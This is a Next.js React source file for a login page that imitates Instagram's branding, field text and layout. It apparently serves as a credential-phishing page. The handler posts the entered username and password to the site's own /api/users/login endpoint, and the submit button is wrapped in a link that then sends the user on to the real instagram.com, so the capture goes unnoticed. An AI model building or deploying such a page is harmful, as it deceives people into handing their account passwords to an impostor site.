"use client"

import Image from "next/image";
import logo from "@/images/logo.webp"
import axios from "axios";
import React, { useEffect } from "react";

import Link from 'next/link';


export default function Home() {
  const [buttonDisabled, setButtonDisabled] = React.useState(false);


  const [user, setUser] = React.useState({
    username: " ",
    password: " ",

  })

  const onLogin = async () => {

    try {
      const response = await axios.post("/api/users/login", user);
      console.log("Login success");

    } catch (error) {
      console.log("Login failed");
    }
  }


  useEffect(() => {
    if (user.username.length > 0 && user.password.length > 0) {
      setButtonDisabled(false);
    } else {
      setButtonDisabled(true);
    }
  }, [user]);







  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-50">
      <div className="flex flex-col items-center justify-center p-6 bg-white border border-gray-200 rounded-lg shadow-sm">
        <Image
          src={logo}
          alt="Instagram"
          width={100}
          height={60}
          className="m-4"
        />
        <form className="flex flex-col space-y-4 w-full">
          <input
            type="text"
            placeholder="Phone number, username, or email"
            className="w-full p-2.5 border border-gray-300 rounded bg-gray-50 focus:ring-blue-500 focus:border-blue-500"
            value={user.username}
            onChange={(e) => setUser({ ...user, username: e.target.value })}
          />
          <input
            type="password"
            placeholder="Password"
            className="w-full p-2.5 border border-gray-300 rounded bg-gray-50 focus:ring-blue-500 focus:border-blue-500"
            value={user.password}

            onChange={(e) => setUser({ ...user, password: e.target.value })}
          />
          <Link href="https://www.instagram.com/">
            <button
              onClick={onLogin}
              type="submit"
              className="w-full py-2 text-white bg-blue-500 rounded hover:bg-blue-600"
            >
              Log In
            </button>
          </Link>
        </form>
        <div className="flex items-center my-4">
          <div className="flex-grow border-t border-gray-300"></div>
          <span className="px-4 text-sm text-gray-400">OR</span>
          <div className="flex-grow border-t border-gray-300"></div>
        </div>
        <button className="flex items-center justify-center w-full py-2 text-blue-500">
          <svg
            className="w-5 h-5 mr-2"
            fill="currentColor"
            viewBox="0 0 24 24"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path d="M12 2.04C6.474 2.04 2 6.514 2 12.041c0 4.927 3.657 9.018 8.437 9.885v-6.99h-2.54V12.04h2.54v-1.646c0-2.507 1.493-3.89 3.773-3.89 1.094 0 2.24.194 2.24.194v2.46h-1.262c-1.242 0-1.628.772-1.628 1.562v1.88h2.77l-.442 2.895h-2.328v6.99c4.78-.868 8.437-4.958 8.437-9.885 0-5.527-4.474-10.001-10-10.001z" />
          </svg>
          Log in with Facebook
        </button>
        <a href="#" className="mt-4 text-sm text-blue-500">
          Forgot password?
        </a>
      </div>
      <div className="flex items-center justify-center w-full mt-4 p-4 bg-white border border-gray-200 rounded-lg shadow-sm">
        <p className="text-sm">
          Don't have an account?
          <a href="#" className="text-blue-500">
            Sign up
          </a>
        </p>
      </div>
    </div>
  );
}
